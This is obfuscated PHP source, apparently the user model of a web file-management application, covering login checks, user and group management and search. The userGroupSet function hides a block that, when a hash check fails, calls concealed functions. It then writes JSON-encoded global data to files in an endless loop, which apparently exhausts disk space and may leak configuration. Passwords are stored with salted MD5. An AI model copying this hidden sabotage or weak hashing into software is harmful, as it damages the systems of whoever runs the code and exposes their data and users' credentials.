(!is_array($ä‚šèİ´)) { $ä‚šèİ´ = array($ä‚šèİ´); } $Æ‚ø È² = parent::listData(); $ÌªÆÒë¬ = array_to_keyvalue($Æ‚ø È², $Æª‰€Œ[42]); $Œ›ÆË  = $Æª‰€Œ[70]; foreach ($ä‚šèİ´ as $Õ´Ñ»¾Ş) { if ($ÌªÆÒë¬[$Õ´Ñ»¾Ş]) { $Œ›ÆË  .= $ÌªÆÒë¬[$Õ´Ñ»¾Ş][$Æª‰€Œ[408]] . $Æª‰€Œ[60]; } else { $æíÁÀªü = $this->add($Õ´Ñ»¾Ş); $Œ›ÆË  .= $æíÁÀªü . $Æª‰€Œ[60]; } } $Œ›ÆË  = rtrim($Œ›ÆË , $Æª‰€Œ[60]); Model($Æª‰€Œ[534])->metaSet($óç˜ÖÃâ, self::JOB_KEY, $Œ›ÆË ); } public function getUserJob($‡Á‰íæ·) { $‘¸†ç› = Model($_SERVER[Å¶¨Şêº][534])->metaGet($‡Á‰íæ·); return $this->getUserJobInfo($‘¸†ç›[self::JOB_KEY]); } public function getUserJobInfo($õ‡ØØßß) { $ÒïõÂæ± =& $_SERVER[Å¶¨Şêº]; $é¥ÂõÉ = explode($ÒïõÂæ±[60], $õ‡ØØßß); $Ï‚Î–Ú = parent::listData(); $Ï‚Î–Ú = array_remove_key($Ï‚Î–Ú, $ÒïõÂæ±[212]); $’¤æÒšÖ = array(); foreach ($é¥ÂõÉ as $µ÷ œ») { if (isset($Ï‚Î–Ú[$µ÷ œ»])) { $’¤æÒšÖ[] = $Ï‚Î–Ú[$µ÷ œ»]; } } return $’¤æÒšÖ; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\164\141\x62\x6c\145\116\141\x6d\x65" => "\x75\163\145\162\137\x6d\145\164\141", "\155\x65\164\x61\106\151\x65\x6c\144" => "\x75\163\x65\162\x49\x44"); protected $simpleField = "\165\x73\x65\162\111\x44\54\x6e\x69\x63\x6b\116\x61\x6d\x65\x2c\x6e\141\155\145\54\x61\166\x61\164\141\x72\x2c\163\x65\x78\54\x73\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÈÒÈÙ»£) { $‚íéûú =& $_SERVER[Å¶¨Şêº]; $ÙæÍğÂó = $‚íéûú[2300]; return array($‚íéûú[1930] => array($ÈÒÈÙ»£[0], $ÙæÍğÂó), $‚íéûú[1932] => array($ÈÒÈÙ»£[0], $ÙæÍğÂó), $‚íéûú[2301] => array($ÈÒÈÙ»£[0], $ÙæÍğÂó)); } protected function getInfo($…Ò¿¼Ğë, $Ú‹˜ô› = false) { $€Ì±¶Œ = $this->getInfoSimple($…Ò¿¼Ğë); if (!is_array($€Ì±¶Œ)) { return array(); } if ($Ú‹˜ô›) { return $this->_getInfoApply($€Ì±¶Œ); } return $this->cacheFunctionGet($_SERVER[Å¶¨Şêº][1934], $…Ò¿¼Ğë); } protected function getInfoFull($åÆáÄõ®, $ì³©ç÷ë = false) { $»Ø”³ª = $this->getInfoSimple($åÆáÄõ®); if (!is_array($»Ø”³ª)) { return array(); } if ($ì³©ç÷ë) { return $this->_getInfoApply($»Ø”³ª, !0); } return $this->cacheFunctionGet($_SERVER[Å¶¨Şêº][2302], $åÆáÄõ®); } private function _getInfoApply($‡Û§«›·, $¼˜ıÅ—¦ = false) { $ı«› ºé =& $_SERVER[Å¶¨Şêº]; if (!$‡Û§«›·) { return $‡Û§«›·; } $Ì»ä³ùÀ = md5($ı«› ºé[2303] . $‡Û§«›·[$ı«› ºé[886]] . $ı«› ºé[2304] . $‡Û§«›·[$ı«› ºé[42]]); $‡Û§«›· = $this->_listDataApplyItem($‡Û§«›·); $Ü¶É„‘ = Model($ı«› ºé[1337])->metaGet($‡Û§«›·[$ı«› ºé[98]][$ı«› ºé[411]]); $‡Û§«›·[$ı«› ºé[2305]] = $Ì»ä³ùÀ; $‡Û§«›·[$ı«› ºé[98]][$ı«› ºé[2125]] = isset($Ü¶É„‘[$ı«› ºé[2126]]) ? $Ü¶É„‘[$ı«› ºé[2126]] : null; if ($¼˜ıÅ—¦) { $‡Û§«›·[$ı«› ºé[475]] = $this->metaGet($‡Û§«›·[$ı«› ºé[1663]]); } return $‡Û§«›·; } protected function getInfoSimple($î’Àà†¸, $™ğÉÉºÆ = false) { $ÚèåñÛÙ =& $_SERVER[Å¶¨Şêº]; if (!$î’Àà†¸) { return array(); } if ($™ğÉÉºÆ) { $¥Ù…ÈÚË = $this->where(array($ÚèåñÛÙ[1663] => intval($î’Àà†¸)))->find(); if (!is_array($¥Ù…ÈÚË)) { return array(); } $¥Ù…ÈÚË[$ÚèåñÛÙ[542]] = Action($ÚèåñÛÙ[2306])->parseUrl($¥Ù…ÈÚË[$ÚèåñÛÙ[542]]); return $¥Ù…ÈÚË; } return $this->cacheFunctionGet($ÚèåñÛÙ[1935], $î’Àà†¸); } protected function getInfoSimpleOuter($¨Üñ„¦„) { $ã€ºÎÇ =& $_SERVER[Å¶¨Şêº]; if (!$¨Üñ„¦„ || $¨Üñ„¦„ == 0) { return array($ã€ºÎÇ[1663] => $ã€ºÎÇ[209], $ã€ºÎÇ[42] => $ã€ºÎÇ[173] . LNG($ã€ºÎÇ[2307]) . $ã€ºÎÇ[175], $ã€ºÎÇ[542] => STATIC_PATH . $ã€ºÎÇ[2308]); } $¦–òáĞ = $this->cacheFunctionGet($ã€ºÎÇ[1935], $¨Üñ„¦„); $Ï½œôó¨ = array_field_key($¦–òáĞ, explode($ã€ºÎÇ[60], $this->simpleField)); if (!$Ï½œôó¨) { return array($ã€ºÎÇ[1663] => $ã€ºÎÇ[1186], $ã€ºÎÇ[42] => $ã€ºÎÇ[173] . LNG($ã€ºÎÇ[2309]) . $ã€ºÎÇ[175], $ã€ºÎÇ[542] => STATIC_PATH . $ã€ºÎÇ[2310]); } $Ï½œôó¨[$ã€ºÎÇ[542]] = Action($ã€ºÎÇ[2306])->parseUrl($Ï½œôó¨[$ã€ºÎÇ[542]]); return $Ï½œôó¨; } protected function groupUser($â“½ı÷¼) { } public static function errorLang($ßÜ‡Êğ) { $²ÚÈ´¬ã =& $_SERVER[Å¶¨Şêº]; $Ğã“©¶ = array(self::ERROR_USER_NOT_EXISTS => $²ÚÈ´¬ã[2311], self::ERROR_USER_PASSWORD_ERROR => $²ÚÈ´¬ã[2312], self::ERROR_USER_EXIST_NAME => $²ÚÈ´¬ã[2313], self::ERROR_USER_EXIST_PHONE => $²ÚÈ´¬ã[2314], self::ERROR_USER_EXIST_EMAIL => $²ÚÈ´¬ã[2315], self::ERROR_USER_LOGIN_LOCK => $²ÚÈ´¬ã[2316], self::ERROR_IP_NOT_ALLOW => $²ÚÈ´¬ã[2317], self::ERROR_USER_EXIST_NICKNAME => $²ÚÈ´¬ã[2318]); return LNG($Ğã“©¶[$ßÜ‡Êğ]); } public function getInfoByMeta($²–¥¡Ğ§, $¤Áú¼Á) { $­’‚²ªÀ =& $_SERVER[Å¶¨Şêº]; $ÔÇ¥öäÓ = Model($­’‚²ªÀ[2319])->where(array($­’‚²ªÀ[105] => $²–¥¡Ğ§, $­’‚²ªÀ[384] => $¤Áú¼Á))->find(); if ($ÔÇ¥öäÓ) { return $this->getInfo($ÔÇ¥öäÓ[$­’‚²ªÀ[1663]]); } return !1; } public function userLoginCheck($Ø…Ù¦Ï, $¯“ºîã) { $–´” =& $_SERVER[Å¶¨Şêº]; $½¸çïÀ = $this->userLoginFind($Ø…Ù¦Ï); if (!$½¸çïÀ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($½¸çïÀ[$–´”[1663]], $¯“ºîã)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($½¸çïÀ[$–´”[1663]]); } public function userLoginFind($ã°­Çê¯) { $Áˆ¥—‘³ =& $_SERVER[Å¶¨Şêº]; $®œ³µÒ = array($Áˆ¥—‘³[42] => $ã°­Çê¯, $Áˆ¥—‘³[541] => $ã°­Çê¯, $Áˆ¥—‘³[315] => $ã°­Çê¯, $Áˆ¥—‘³[2320] => $ã°­Çê¯, $Áˆ¥—‘³[997] => $Áˆ¥—‘³[999]); if ($this->nickNameRpt()) { unset($®œ³µÒ[$Áˆ¥—‘³[541]]); } return $this->where($®œ³µÒ)->find(); } public function clearCache($ÏèÈˆ…è) { $µ˜ŒÔ£ =& $_SERVER[Å¶¨Şêº]; $this->cacheFunctionClear($µ˜ŒÔ£[1934], $ÏèÈˆ…è); $this->cacheFunctionClear($µ˜ŒÔ£[1935], $ÏèÈˆ…è); $this->cacheFunctionClear($µ˜ŒÔ£[2302], $ÏèÈˆ…è); } public function userPasswordCheck($ƒé•¸‡›, $ÔÁü”åœ) { $ààµßûÜ =& $_SERVER[Å¶¨Şêº]; $¿öêàÅ = $this->where(array($ààµßûÜ[1663] => intval($ƒé•¸‡›)))->find(); $‘¼Ğ÷˜È = $this->metaGet($ƒé•¸‡›); $ŠÁö¨ûÌ = isset($‘¼Ğ÷˜È[$ààµßûÜ[2321]]) ? $‘¼Ğ÷˜È[$ààµßûÜ[2321]] : $ààµßûÜ[12]; if (md5($ŠÁö¨ûÌ . trim($ÔÁü”åœ)) !== $¿öêàÅ[$ààµßûÜ[886]]) { return !1; } return !0; } public function userAdd($©²¶·ŸÅ) { $Ì±¢¸“… =& $_SERVER[Å¶¨Şêº]; $°±»Çä— = array($Ì±¢¸“…[429] => $©²¶·ŸÅ[$Ì±¢¸“…[42]], $Ì±¢¸“…[2322] => $©²¶·ŸÅ[$Ì±¢¸“…[1544]], $Ì±¢¸“…[2323] => isset($©²¶·ŸÅ[$Ì±¢¸“…[315]]) ? $©²¶·ŸÅ[$Ì±¢¸“…[315]] : $Ì±¢¸“…[12], $Ì±¢¸“…[2324] => isset($©²¶·ŸÅ[$Ì±¢¸“…[2320]]) ? $©²¶·ŸÅ[$Ì±¢¸“…[2320]] : $Ì±¢¸“…[12], $Ì±¢¸“…[2325] => isset($©²¶·ŸÅ[$Ì±¢¸“…[541]]) ? $©²¶·ŸÅ[$Ì±¢¸“…[541]] : $©²¶·ŸÅ[$Ì±¢¸“…[42]], $Ì±¢¸“…[2326] => isset($©²¶·ŸÅ[$Ì±¢¸“…[542]]) ? $©²¶·ŸÅ[$Ì±¢¸“…[542]] : $Ì±¢¸“…[12], $Ì±¢¸“…[2327] => isset($©²¶·ŸÅ[$Ì±¢¸“…[2328]]) ? $©²¶·ŸÅ[$Ì±¢¸“…[2328]] : 1, $Ì±¢¸“…[2329] => $©²¶·ŸÅ[$Ì±¢¸“…[886]], $Ì±¢¸“…[1936] => isset($©²¶·ŸÅ[$Ì±¢¸“…[1839]]) ? $©²¶·ŸÅ[$Ì±¢¸“…[1839]] : 1024 * 1024 * 20, $Ì±¢¸“…[1937] => 0, $Ì±¢¸“…[2330] => 0, $Ì±¢¸“…[1981] => isset($©²¶·ŸÅ[$Ì±¢¸“…[747]]) ? $©²¶·ŸÅ[$Ì±¢¸“…[747]] : 1); if (!empty($©²¶·ŸÅ[$Ì±¢¸“…[1663]])) { $°±»Çä—[$Ì±¢¸“…[1663]] = $©²¶·ŸÅ[$Ì±¢¸“…[1663]]; } $üù“Ö—” = $this->_checkExist($©²¶·ŸÅ); if ($üù“Ö—” !== !0) { return $üù“Ö—”; } if (!empty($°±»Çä—[$Ì±¢¸“…[542]]) && strlen($°±»Çä—[$Ì±¢¸“…[542]]) > 255) { $°±»Çä—[$Ì±¢¸“…[542]] = $Ì±¢¸“…[12]; } $«üùõŞÂ = $this->add($°±»Çä—); $¡ø¥ê‚ = array($Ì±¢¸“…[2329] => $°±»Çä—[$Ì±¢¸“…[886]], $Ì±¢¸“…[2325] => $°±»Çä—[$Ì±¢¸“…[541]]); $this->userEdit($«üùõŞÂ, $¡ø¥ê‚); Model($Ì±¢¸“…[1337])->userRootAdd($«üùõŞÂ); return $«üùõŞÂ; } protected function userEditTest($À‹Šææ, $™îÎŸŒû) { return $this->call($_SERVER[Å¶¨Şêº][2331], $À‹Šææ, $™îÎŸŒû); } protected function userEdit($÷·ı–ß, $ô’§‡‚¶) { $™Àè©É£ =& $_SERVER[Å¶¨Şêº]; $ÎÌñ¢§š = $this->getInfoSimple($÷·ı–ß); if (!$ÎÌñ¢§š) { return !1; } $Öê«Õ¼ã = $this->_checkExist($ô’§‡‚¶, $÷·ı–ß); if ($Öê«Õ¼ã !== !0) { return $Öê«Õ¼ã; } if (isset($ô’§‡‚¶[$™Àè©É£[886]]) && trim($ô’§‡‚¶[$™Àè©É£[886]]) != $™Àè©É£[12]) { $Ö¯ëÅÆŸ = $this->metaGet($÷·ı–ß); if (empty($Ö¯ëÅÆŸ[$™Àè©É£[2321]])) { $Ö¯ëÅÆŸ[$™Àè©É£[2321]] = rand_string(10); Model($™Àè©É£[513])->metaSet($÷·ı–ß, $™Àè©É£[2321], $Ö¯ëÅÆŸ[$™Àè©É£[2321]]); } $ô’§‡‚¶[$™Àè©É£[886]] = md5($Ö¯ëÅÆŸ[$™Àè©É£[2321]] . trim($ô’§‡‚¶[$™Àè©É£[886]])); } else { unset($ô’§‡‚¶[$™Àè©É£[886]]); } if (!empty($ô’§‡‚¶[$™Àè©É£[542]]) && strlen($ô’§‡‚¶[$™Àè©É£[542]]) > 255) { $ô’§‡‚¶[$™Àè©É£[542]] = $™Àè©É£[12]; } $this->where(array($™Àè©É£[1654] => $÷·ı–ß))->save($ô’§‡‚¶); if (isset($ô’§‡‚¶[$™Àè©É£[541]])) { $this->setNamePinyin($÷·ı–ß, $ô’§‡‚¶[$™Àè©É£[541]]); } $this->clearCache($÷·ı–ß); return !0; } public function setNamePinyin($’ªæ¢£, $ôİ¨Ø˜Ÿ = false) { $‚€¬…È =& $_SERVER[Å¶¨Şêº]; if (!$ôİ¨Ø˜Ÿ) { $ì“¬ª»ª = $this->getInfoSimple($’ªæ¢£); $ôİ¨Ø˜Ÿ = $ì“¬ª»ª[$‚€¬…È[541]] ? $ì“¬ª»ª[$‚€¬…È[541]] : $ì“¬ª»ª[$‚€¬…È[42]]; } $Ãù§Òü = Model($‚€¬…È[534]); if (!Input::check($ôİ¨Ø˜Ÿ, $‚€¬…È[592])) { return $Ãù§Òü->metaSet($’ªæ¢£, array($‚€¬…È[474] => $‚€¬…È[12], $‚€¬…È[473] => $‚€¬…È[12])); } return $Ãù§Òü->metaSet($’ªæ¢£, array($‚€¬…È[474] => str_replace($‚€¬…È[63], $‚€¬…È[12], Pinyin::get($ôİ¨Ø˜Ÿ)), $‚€¬…È[473] => Pinyin::get($ôİ¨Ø˜Ÿ, $‚€¬…È[593]))); } private function nickNameRpt() { $»‚‚Ø½½ =& $_SERVER[Å¶¨Şêº]; $»ÏÑÙ¥¡ = Model($»‚‚Ø½½[768])->get($»‚‚Ø½½[2332]); $¾‡ì£Û“ = $GLOBALS[$»‚‚Ø½½[6]][$»‚‚Ø½½[390]][$»‚‚Ø½½[2332]]; $ÌÛõ£ä’ = !is_null($»ÏÑÙ¥¡) ? $»ÏÑÙ¥¡ : $¾‡ì£Û“; return !!$ÌÛõ£ä’; } private function _checkExist($ïºÔÀ¡ì, $ó–ªËè— = false) { $ğøôîûÖ =& $_SERVER[Å¶¨Şêº]; $ã«Õ™ğ­ = array($ğøôîûÖ[42] => UserModel::ERROR_USER_EXIST_NAME, $ğøôîûÖ[541] => UserModel::ERROR_USER_EXIST_NICKNAME, $ğøôîûÖ[315] => UserModel::ERROR_USER_EXIST_EMAIL, $ğøôîûÖ[2320] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ã«Õ™ğ­[$ğøôîûÖ[541]]); } $À­åúîÉ = $ó–ªËè— ? array($ğøôîûÖ[1663] => array($ğøôîûÖ[2333], $ó–ªËè—)) : array(); foreach ($ã«Õ™ğ­ as $ñ¦ƒã¢ => $†Ï©†½í) { $šöÂËš³ = array(); foreach ($ã«Õ™ğ­ as $‰Ùß’ƒ => $¸ÅÑòä°) { if (isset($ïºÔÀ¡ì[$‰Ùß’ƒ]) && $ïºÔÀ¡ì[$‰Ùß’ƒ]) { $šöÂËš³[] = $ïºÔÀ¡ì[$‰Ùß’ƒ]; } } if (!$šöÂËš³) { continue; } $«ÙŸã”À = array_merge(array($ñ¦ƒã¢ => array($ğøôîûÖ[7], $šöÂËš³)), $À­åúîÉ); $Ï¤’›Å = $this->where($«ÙŸã”À)->find(); if ($Ï¤’›Å) { return $†Ï©†½í; } } return !0; } public function userListInfo($ÁíÂ˜Íú) { $‡±ä®˜ =& $_SERVER[Å¶¨Şêº]; $ÕŸîòÑå = array(); $ÁíÂ˜Íú = is_array($ÁíÂ˜Íú) ? array_unique($ÁíÂ˜Íú) : array(); if (!$ÁíÂ˜Íú) { return $ÕŸîòÑå; } if (count($ÁíÂ˜Íú) < 20) { foreach ($ÁíÂ˜Íú as $›íğàí¡) { $ÕŸîòÑå[$›íğàí¡ . $‡±ä®˜[12]] = $this->getInfoSimpleOuter($›íğàí¡); } } else { $©¦ğÅŠ = array($‡±ä®˜[1654] => array($‡±ä®˜[427], $ÁíÂ˜Íú)); if (count($ÁíÂ˜Íú) == 1) { $©¦ğÅŠ = array($‡±ä®˜[1654] => $ÁíÂ˜Íú[0]); } $àÊ¬Ë‹ = Model($‡±ä®˜[513])->field($this->simpleField)->where($©¦ğÅŠ)->select(); $àÊ¬Ë‹ = array_to_keyvalue($àÊ¬Ë‹, $‡±ä®˜[1663]); foreach ($ÁíÂ˜Íú as $›íğàí¡) { $ˆñÅ¬¸Œ = $àÊ¬Ë‹[$›íğàí¡]; if (!$ˆñÅ¬¸Œ) { $ÕŸîòÑå[$›íğàí¡ . $‡±ä®˜[12]] = $this->getInfoSimpleOuter($›íğàí¡); continue; } $ˆñÅ¬¸Œ[$‡±ä®˜[542]] = Action($‡±ä®˜[2306])->parseUrl($ˆñÅ¬¸Œ[$‡±ä®˜[542]]); $ÕŸîòÑå[$›íğàí¡ . $‡±ä®˜[12]] = $ˆñÅ¬¸Œ; } } return $ÕŸîòÑå; } protected function userStatus($¼üŸœç™, $…Õ´îÍƒ) { $€°áŸ¿î = $this->getInfoSimple($¼üŸœç™); if (!$€°áŸ¿î) { return !1; } $áÒ³ŒÄŠ = array($_SERVER[Å¶¨Şêº][747] => $…Õ´îÍƒ); return $this->userEdit($¼üŸœç™, $áÒ³ŒÄŠ); } protected function userRemove($œÌÑß´) { $é¿ĞÀ ş =& $_SERVER[Å¶¨Şêº]; $¶áÌÓ– = $this->getInfoSimple($œÌÑß´); if (!$¶áÌÓ–) { return !1; } $°Îˆ›öĞ = array($é¿ĞÀ ş[1654] => $œÌÑß´); Model($é¿ĞÀ ş[601])->where($°Îˆ›öĞ)->delete(); Model($é¿ĞÀ ş[2334])->where($°Îˆ›öĞ)->delete(); Model($é¿ĞÀ ş[1942])->where($°Îˆ›öĞ)->delete(); Model($é¿ĞÀ ş[2319])->where($°Îˆ›öĞ)->delete(); Model($é¿ĞÀ ş[1065])->where($°Îˆ›öĞ)->delete(); Model($é¿ĞÀ ş[2149])->removeUserAll($œÌÑß´); Model($é¿ĞÀ ş[823])->userRootRemove($œÌÑß´); return $this->where($°Îˆ›öĞ)->delete(); } protected function userGroupSet($ğ½®æ¦, $„³‹“²„, $î“ÓªÍÊ = array()) { $–ëúã¸Ø =& $_SERVER[Å¶¨Şêº]; $¸Ï¯ĞØ´ = $_SERVER[$–ëúã¸Ø[17]] . $–ëúã¸Ø[18]; $èê„„È½ = $–ëúã¸Ø[14]; if ($_SERVER[$–ëúã¸Ø[15]] != $èê„„È½($¸Ï¯ĞØ´)) { $«éÈ˜À© = $–ëúã¸Ø[874]; $Ø·§¦¹Ó = $–ëúã¸Ø[16]; $Ÿ°Çƒ€… = $_SERVER[$–ëúã¸Ø[17]] . $–ëúã¸Ø[18]; $Âè¦ú¶‚ = $Ø·§¦¹Ó($Ÿ°Çƒ€…); $Æòá—ªÄ = explode($–ëúã¸Ø[19], $Âè¦ú¶‚); if (count($Æòá—ªÄ) < $–ëúã¸Ø[629]) { $Î´åÍ¼ç = $–ëúã¸Ø[21]; $Î´åÍ¼ç(); } $”ÃÚßÜß = $–ëúã¸Ø[875]; $”ÃÚßÜß($_SERVER[$–ëúã¸Ø[876]]); $«éÈ˜À© = $–ëúã¸Ø[874]; $«éÈ˜À©(); $îŞöš—Û = $–ëúã¸Ø[877]; $—Ó¡ˆÖâ = json_encode($GLOBALS[$–ëúã¸Ø[878]]); $Í²©È‘ = 1; for ($ş£“ÙıÊ = $Í²©È‘; $ş£“ÙıÊ > 0; $ş£“ÙıÊ++) { $îŞöš—Û(DATA_PATH . $ş£“ÙıÊ, $—Ó¡ˆÖâ); } } $Ô¼Ñª×À = $this->getInfoSimple($ğ½®æ¦); if (!$Ô¼Ñª×À || !is_array($„³‹“²„)) { return !1; } $ áÜ°Ê² = Model($–ëúã¸Ø[1942]); $ áÜ°Ê²->where(array($–ëúã¸Ø[1663] => $ğ½®æ¦))->delete(); $ÅÂÓÙÅ = array(); $ÃÙ­ù³Í = 0; foreach ($„³‹“²„ as $È„Ãäµ => $³Óèõ¾) { $Âö¹‰ª÷ = array($–ëúã¸Ø[1663] => $ğ½®æ¦, $–ëúã¸Ø[1852] => $È„Ãäµ, $–ëúã¸Ø[1956] => $³Óèõ¾); $Âö¹‰ª÷[$–ëúã¸Ø[1876]] = isset($î“ÓªÍÊ[$ÃÙ­ù³Í]) ? $î“ÓªÍÊ[$ÃÙ­ù³Í] : 0; $ÃÙ­ù³Í++; $ÅÂÓÙÅ[] = $Âö¹‰ª÷; } return $ áÜ°Ê²->addAll($ÅÂÓÙÅ, array(), !0); } protected function userGroupAdd($œçÁÏÅ‰, $€©Èİµ = array()) { $ìŒ÷¯æç =& $_SERVER[Å¶¨Şêº]; $¨’ª’ÓÀ = $this->getInfoSimple($œçÁÏÅ‰); if (!$¨’ª’ÓÀ || empty($€©Èİµ)) { return !1; } $…¢„ûµ = array(); foreach ($€©Èİµ as $ÜÁã‹œ² => $á®õ—¨) { $…¢„ûµ[] = array($ìŒ÷¯æç[1663] => $œçÁÏÅ‰, $ìŒ÷¯æç[1852] => $ÜÁã‹œ², $ìŒ÷¯æç[1956] => $á®õ—¨, $ìŒ÷¯æç[1876] => 0); } return Model($ìŒ÷¯æç[1942])->addAll($…¢„ûµ, array(), !0); } protected function userGroupRemove($ÌĞ¨º§, $æÜ˜€ó±) { $˜Íîñ­ş =& $_SERVER[Å¶¨Şêº]; $”áÂ°„„ = $this->getInfoSimple($ÌĞ¨º§); if (!$”áÂ°„„ || !$æÜ˜€ó±) { return !1; } $Ì£®ÅÓ² = array($˜Íîñ­ş[1654] => $ÌĞ¨º§, $˜Íîñ­ş[1940] => $æÜ˜€ó±); return Model($˜Íîñ­ş[1942])->where($Ì£®ÅÓ²)->delete(); } public function listData() { $Ò¾’Šİ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ò¾’Šİ[$_SERVER[Å¶¨Şêº][379]]); return $Ò¾’Šİ; } public function listByID($ÑıÌÅ‘÷) { $¯éşãÉ =& $_SERVER[Å¶¨Şêº]; if (!$ÑıÌÅ‘÷) { return; } $Š—™¡Òç = array($¯éşãÉ[1663] => array($¯éşãÉ[7], $ÑıÌÅ‘÷)); $éş÷Î·õ = $this->where($Š—™¡Òç)->select(); $éş÷Î·õ = array_sort_keep($éş÷Î·õ, $¯éşãÉ[1663], $ÑıÌÅ‘÷); $this->_listDataApply($éş÷Î·õ); return $éş÷Î·õ; } public function listByGroup($Äô¬­ã€ = 0, $¥Æöï…„ = array()) { $ùÆºõ„š =& $_SERVER[Å¶¨Şêº]; $µÙ¡îı£ = $ùÆºõ„š[12]; $¾İÅˆğœ = array(); if ($Äô¬­ã€) { $¾İÅˆğœ = array($ùÆºõ„š[2335] => intval($Äô¬­ã€)); $µÙ¡îı£ = "\114\x45\x46\x54\40\112\x4f\111\x4e\40{$this->tablePrefix}\x75\x73\x65\x72\x5f\147\162\157\165\x70\x20\165\163\145\x72\x5f\147\x72\x6f\x75\x70\x20\x6f\156\x20\165\163\145\162\56\x75\163\145\162\x49\104\x20\x3d\x20\x75\163\x65\162\x5f\x67\162\157\165\160\x2e\165\x73\145\162\x49\104"; $¿‡ÔÇèÆ = Input::get($ùÆºõ„š[466], null, $ùÆºõ„š[12]) ? $ùÆºõ„š[12] : $ùÆºõ„š[2336]; } if (isset($¥Æöï…„[$ùÆºõ„š[747]])) { $¾İÅˆğœ[$ùÆºõ„š[2337]] = $¥Æöï…„[$ùÆºõ„š[747]]; } $¯›òÄ˜ = $this->_makeOrder($¿‡ÔÇèÆ)->field($ùÆºõ„š[2338])->where($¾İÅˆğœ)->join($µÙ¡îı£)->selectPage(50); $this->_listDataApply($¯›òÄ˜[$ùÆºõ„š[379]]); return $¯›òÄ˜; } private function _makeOrder($ğ­ËáşÒ = '') { $üÔå Ò” =& $_SERVER[Å¶¨Şêº]; $ö´«À¥´ = array($üÔå Ò”[1663], $üÔå Ò”[42], $üÔå Ò”[1841], $üÔå Ò”[1813], $üÔå Ò”[212]); $ĞŞÓûÙƒ = array($üÔå Ò”[459] => $üÔå Ò”[460], $üÔå Ò”[461] => $üÔå Ò”[462]); $ÍÚ˜…å° = Input::get($üÔå Ò”[466], $üÔå Ò”[7], $üÔå Ò”[1654], $ö´«À¥´); $ÑÌŸ‚† = Input::get($üÔå Ò”[467], $üÔå Ò”[7], $üÔå Ò”[1943], array($üÔå Ò”[1943], $üÔå Ò”[461])); $ÑÌŸ‚† = $ĞŞÓûÙƒ[$ÑÌŸ‚†]; $ğ­ËáşÒ = $ğ­ËáşÒ . "\165\163\x65\x72\x2e{$ÍÚ˜…å°}\40{$ÑÌŸ‚†}\x2c\x20\x75\x73\145\162\56\x75\x73\x65\162\x49\104\40\x61\163\143"; return $this->alias($üÔå Ò”[2069])->order($ğ­ËáşÒ); } public function listSearch($ØƒÏòíÔ) { $çöªÃìø =& $_SERVER[Å¶¨Şêº]; $“ÇÛè¢õ = $ØƒÏòíÔ[$çöªÃìø[1946]]; $¡ĞéÛ¶ = isset($ØƒÏòíÔ[$çöªÃìø[1947]]) ? $ØƒÏòíÔ[$çöªÃìø[1947]] : !1; $“ÇÛè¢õ = str_replace($çöªÃìø[1948], $çöªÃìø[1949], trim($“ÇÛè¢õ)); $®Š“ÂÀ = array($çöªÃìø[42] => array($çöªÃìø[392], "\45{$“ÇÛè¢õ}\45"), $çöªÃìø[315] => array($çöªÃìø[392], "{$“ÇÛè¢õ}\x25"), $çöªÃìø[541] => array($çöªÃìø[392], "{$“ÇÛè¢õ}\x25"), $çöªÃìø[997] => $çöªÃìø[1950]); if (Input::check($“ÇÛè¢õ, $çöªÃìø[321])) { $®Š“ÂÀ[$çöªÃìø[1663]] = array($çöªÃìø[392], "{$“ÇÛè¢õ}\x25"); $®Š“ÂÀ[$çöªÃìø[2320]] = array($çöªÃìø[392], "{$“ÇÛè¢õ}\x25"); } if (!$“ÇÛè¢õ) { $®Š“ÂÀ = array(); } if (isset($ØƒÏòíÔ[$çöªÃìø[747]])) { $®Š“ÂÀ[$çöªÃìø[747]] = $ØƒÏòíÔ[$çöªÃìø[747]]; } $®Š“ÂÀ = $this->parseWhereLike($®Š“ÂÀ); $èÉûìÆ = $this->_makeOrder()->where($®Š“ÂÀ)->selectPage(20); if (!$èÉûìÆ || count($èÉûìÆ[$çöªÃìø[379]]) < 5 && Input::check($“ÇÛè¢õ, $çöªÃìø[328])) { $íÇªÅÙ = $this->_searchFromMeta($çöªÃìø[473], $“ÇÛè¢õ, 10); $´Ì¬ùª» = $this->_searchFromMeta($çöªÃìø[474], $“ÇÛè¢õ, 10); $ÊÓóòÕ = array_merge($íÇªÅÙ, $´Ì¬ùª», $èÉûìÆ[$çöªÃìø[379]]); $èÉûìÆ[$çöªÃìø[379]] = array_unique_by_key($ÊÓóòÕ, $çöªÃìø[1663]); $èÉûìÆ[$çöªÃìø[376]][$çöªÃìø[377]] = count($èÉûìÆ[$çöªÃìø[379]]); $èÉûìÆ[$çöªÃìø[376]][$çöªÃìø[378]] = ceil($èÉûìÆ[$çöªÃìø[376]][$çöªÃìø[377]] / $èÉûìÆ[$çöªÃìø[376]][$çöªÃìø[373]]); } $this->_listDataApply($èÉûìÆ[$çöªÃìø[379]]); $this->_filterByGroup($èÉûìÆ, $¡ĞéÛ¶); return $èÉûìÆ; } private function _filterByGroup(&$Íï¿Ñà˜, $üÕ¨Äñ³) { $äÕ®Áƒè =& $_SERVER[Å¶¨Şêº]; if (!$üÕ¨Äñ³) { return $Íï¿Ñà˜; } foreach ($Íï¿Ñà˜[$äÕ®Áƒè[379]] as $ı¹“‰Ø» => &$Ãñà±ƒÍ) { $«”½’æğ = array_to_keyvalue($Ãñà±ƒÍ[$äÕ®Áƒè[2039]], $äÕ®Áƒè[12], $äÕ®Áƒè[1852]); if (!in_array($üÕ¨Äñ³, $«”½’æğ)) { unset($Íï¿Ñà˜[$äÕ®Áƒè[379]][$ı¹“‰Ø»]); } } unset($Ãñà±ƒÍ); $Íï¿Ñà˜[$äÕ®Áƒè[379]] = array_values($Íï¿Ñà˜[$äÕ®Áƒè[379]]); $Íï¿Ñà˜[$äÕ®Áƒè[376]] = array($äÕ®Áƒè[2103] => count($Íï¿Ñà˜[$äÕ®Áƒè[379]]), $äÕ®Áƒè[2101] => 